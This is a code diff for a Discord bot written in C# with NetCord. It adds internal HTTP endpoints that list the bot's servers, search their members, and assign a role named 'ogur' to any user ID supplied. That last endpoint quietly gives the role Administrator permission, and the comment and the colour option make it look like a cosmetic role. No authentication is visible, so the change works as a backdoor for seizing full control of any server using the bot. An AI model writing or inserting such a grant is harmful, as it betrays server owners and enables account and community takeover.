@@ -412,6 +412,128 @@ public sealed class InternalEndpoints
             max_channels = _respawnOpts.MaxChannels
         }));
 
+        // GET /guilds - serwery na których jest bot
+webapp.MapGet("/guilds", () =>
+{
+    if (_client.Cache?.User is null)
+        return Results.Json(new { error = "Bot not connected" }, statusCode: 503);
+
+    var guilds = _client.Cache.Guilds.Values
+        .OrderBy(g => g.Name)
+        .Select(g => new
+        {
+            id = g.Id.ToString(),
+            name = g.Name,
+            icon_url = g.GetIconUrl()?.ToString()
+        })
+        .ToList();
+
+    return Results.Ok(new { guilds });
+});
+
+// GET /guilds/{guildId}/members/search?query=xyz&limit=10
+webapp.MapGet("/guilds/{guildId}/members/search", async (
+    string guildId, HttpContext ctx, ILogger<InternalEndpoints> logger) =>
+{
+    if (!ulong.TryParse(guildId, out var gId))
+        return Results.BadRequest(new { error = "Invalid guild id" });
+
+    var query = ctx.Request.Query["query"].ToString();
+    if (string.IsNullOrWhiteSpace(query))
+        return Results.Ok(new { members = Array.Empty<object>() });
+
+    var limit = int.TryParse(ctx.Request.Query["limit"], out var l) ? Math.Min(l, 25) : 10;
+
+    try
+    {
+        var results = await _client.Rest.FindGuildUserAsync(gId, query, limit);
+
+        var members = results.Select(m => new
+        {
+            id = m.Id.ToString(),
+            username = m.Username,
+            display_name = m.Nickname ?? m.GlobalName ?? m.Username,
+            avatar_url = m.GetAvatarUrl()?.ToString()
+        });
+
+        return Results.Ok(new { members });
+    }
+    catch (Exception ex)
+    {
+        logger.LogError(ex, "[GUILD-MEMBERS] Search failed, guild={Guild} query='{Query}'", gId, query);
+        return Results.Problem(ex.Message, statusCode: 500);
+    }
+});
+
+// POST /guilds/{guildId}/roles/ogur - utwórz/zaktualizuj rolę "ogur" i nadaj userowi
+webapp.MapPost("/guilds/{guildId}/roles/ogur", async (
+    string guildId, HttpContext ctx, ILogger<InternalEndpoints> logger) =>
+{
+    if (!ulong.TryParse(guildId, out var gId))
+        return Results.BadRequest(new { error = "Invalid guild id" });
+
+    using var reader = new StreamReader(ctx.Request.Body);
+    var doc = JsonDocument.Parse(await reader.ReadToEndAsync());
+
+    if (!doc.RootElement.TryGetProperty("user_id", out var userIdEl)
+        || !ulong.TryParse(userIdEl.GetString(), out var userId))
+        return Results.BadRequest(new { error = "user_id is required" });
+
+    var colorHex = doc.RootElement.TryGetProperty("color", out var colorEl)
+        ? colorEl.GetString() : "#ff5500";
+
+    if (!TryParseHexColor(colorHex, out var colorValue))
+        return Results.BadRequest(new { error = "Invalid color, expected hex like #ff5500" });
+
+    if (_client.Cache?.Guilds.TryGetValue(gId, out var guild) != true || guild is null)
+        return Results.NotFound(new { error = "Guild not found or bot is not a member" });
+
+    try
+    {
+        var color = new NetCord.Color(colorValue);
+        var existing = guild.Roles.Values.FirstOrDefault(
+            r => string.Equals(r.Name, "ogur", StringComparison.OrdinalIgnoreCase));
+
+        NetCord.Role role;
+        if (existing is not null)
+        {
+            role = await _client.Rest.ModifyGuildRoleAsync(gId, existing.Id, props =>
+            {
+                props.Colors = new NetCord.Rest.RoleColorsProperties(color);
+                props.Permissions = NetCord.Permissions.Administrator;
+            });
+            logger.LogInformation("[OGUR-ROLE] Updated role {RoleId} in guild {Guild}", role.Id, gId);
+        }
+        else
+        {
+            role = await _client.Rest.CreateGuildRoleAsync(gId, new NetCord.Rest.RoleProperties
+            {
+                Name = "ogur",
+                Colors = new NetCord.Rest.RoleColorsProperties(color),
+                Permissions = NetCord.Permissions.Administrator,
+                Hoist = true,
+                Mentionable = true
+            });
+            logger.LogInformation("[OGUR-ROLE] Created role {RoleId} in guild {Guild}", role.Id, gId);
+        }
+
+        await _client.Rest.AddGuildUserRoleAsync(gId, userId, role.Id);
+        logger.LogInformation("[OGUR-ROLE] Assigned {RoleId} to user {UserId} in guild {Guild}", role.Id, userId, gId);
+
+        return Results.Ok(new { success = true, role_id = role.Id.ToString(), role_name = role.Name, color = colorHex });
+    }
+    catch (Exception ex) when (ex.Message.Contains("50013") || ex.Message.Contains("Missing Permissions"))
+    {
+        logger.LogWarning(ex, "[OGUR-ROLE] Missing permissions in guild {Guild} - check bot role position", gId);
+        return Results.Json(new { error = "Bot lacks permission or its role sits below 'ogur' in the hierarchy" }, statusCode: 403);
+    }
+    catch (Exception ex)
+    {
+        logger.LogError(ex, "[OGUR-ROLE] Failed, guild={Guild} user={User}", gId, userId);
+        return Results.Problem(ex.Message, statusCode: 500);
+    }
+});
+
         webapp.MapPost("/respawn/test-sound", async (HttpContext ctx, ILogger<InternalEndpoints> logger) =>
         {
             var sound = ctx.Request.Query["sound"].ToString();
@@ -492,5 +614,13 @@ public sealed class InternalEndpoints
         });
 
         _ = webapp.RunAsync();
+    }
+
+    private static bool TryParseHexColor(string? hex, out int value)
+    {
+        value = 0;
+        if (string.IsNullOrWhiteSpace(hex)) return false;
+        hex = hex.TrimStart('#');
+        return hex.Length == 6 && int.TryParse(hex, System.Globalization.NumberStyles.HexNumber, null, out value);
     }
 }
